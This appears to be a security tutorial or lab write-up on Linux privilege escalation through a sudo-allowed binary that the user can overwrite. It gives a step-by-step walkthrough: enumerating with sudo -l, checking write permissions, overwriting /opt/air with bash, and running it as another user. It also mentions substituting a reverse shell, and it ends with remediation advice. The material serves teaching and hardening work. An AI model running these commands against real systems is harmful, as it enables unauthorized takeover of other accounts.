## Privilege Escalation: Writable Sudo Executables

This privilege escalation vector occurs when a user is allowed to run a specific binary via `sudo`, but holds write permissions over that binary or its parent directory. By replacing or modifying the executable's contents with a shell binary, an attacker turns a restricted execution rule into immediate shell access.

---

## Technical Mechanics & Requirements

This attack relies on three distinct permission layers interacting on a Linux system:

### 1. The `sudoers` Configuration (`/etc/sudoers`)

The system administrator grants execution rights based on the file's absolute path, without validating the binary's integrity or hash:

```text
www-data ALL=(sam) NOPASSWD: /opt/air

```

* **Trust Boundary:** `sudo` verifies who is invoking the command (`www-data`), target user (`sam`), and target path (`/opt/air`). It does **not** check what code is inside `/opt/air`.

### 2. File Ownership and DAC Permissions

The targeted file `/opt/air` has permissions that permit modification by the low-privileged user or their group:

```text
-rwxrwxrwx 1 root root 16384 Jul 28 10:00 /opt/air

```

Alternatively, if `/opt/air` itself is read-only but the parent directory `/opt/` is writable by `www-data` (`drwxrwxr-x`), an attacker can remove the file and create a new executable with the same name.

### 3. In-Place Stream Redirection (`cat`)

Using stream redirection writes binary contents directly into the target file descriptor:

```bash
cat /usr/bin/bash > /opt/air

```

* **Preservation of Attributes:** Overwriting via `cat` alters the file's content payload without changing its metadata, execution flags (`+x`), or ownership structure.

---

## Exploit Execution Walkthrough

1. **Enumeration (Checking Sudo Rules):** Identify binaries executable with elevated privileges.
Inspect allowed commands for the current user:

```bash
sudo -l

```

*Output:*

```text
User www-data may run the following commands on target:
    (sam) NOPASSWD: /opt/air

```


2. **Permission Audit:** Verify write access to binary or directory.
Check discretionary access control (DAC) permissions on the binary and parent folder:

```bash
ls -l /opt/air
ls -ld /opt

```

Confirm `w` (write) permission is enabled for `www-data` or `others`.


3. **Overwriting the Binary:** Replace application payload with interactive shell.
Locate a system shell and overwrite the targeted binary using stream redirection:

```bash
which bash
cat /usr/bin/bash > /opt/air

```

*Note:* Alternatively, copy a custom reverse shell script into `/opt/air` using `cp` or `echo`.


4. **Privilege Escalation Execution:** Invoke sudo rule to obtain target context.
Run the modified path through `sudo`:

```bash
sudo -u sam /opt/air

```

`sudo` evaluates the rule against `/opt/air`, validates the permission, and executes the raw `bash` code in `sam`'s security context.


---

## Defensive Remediation

To secure `sudo` executables against unauthorized modification:

* **Enforce Strict Ownership:** Ensure all `sudo`-managed binaries and their parent paths are owned by `root:root` with permissions restricted to `755` (`rwxr-xr-x`) or `750` (`rwxr-x---`).
* **Directory Security:** Verify target directory paths are not writable by standard users, preventing deletion/renaming attacks.
* **Integrity Monitoring:** Use file integrity monitoring tools (FIM) or explicit digest checking in system configurations where sensitive commands reside outside default protected paths (`/usr/bin`, `/sbin`).
